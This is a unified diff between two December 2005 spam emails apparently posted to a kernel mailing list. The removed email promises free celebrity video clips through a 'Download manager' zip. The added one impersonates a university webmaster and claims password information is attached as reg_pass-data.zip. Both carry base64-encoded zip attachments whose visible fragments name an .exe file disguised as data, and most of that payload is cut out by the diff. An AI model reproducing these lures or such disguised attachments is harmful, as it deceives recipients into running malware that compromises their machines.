@@ -1,30 +1,29 @@
-From: hostmaster@yahoo.de
-Subject: Paris Hilton & Nicole Richie
-Date: Tue, 20 Dec 2005 21:05:13 UTC
-Message-ID: <7fc04dc9.bb1bfae@oss.sgi.com>
+From: webmaster@rpi.edu
+Subject: Your Password
+Date: Tue, 20 Dec 2005 21:49:42 UTC
+Message-ID: <0854ace7bec1.5fbed5@wiiny.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=ef9fe90.d4f5fc5"
+Content-Type: multipart/mixed; boundary="37699462a.a3b8df5c"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: listening@oss.sgi.com
+To: ralf@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=ef9fe90.d4f5fc5
+--37699462a.a3b8df5c
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---=ef9fe90.d4f5fc5
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.rpi.edu
+***** Email: postman@rpi.edu
+--37699462a.a3b8df5c
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=ef9fe90.d4f5fc5--
+--37699462a.a3b8df5c--
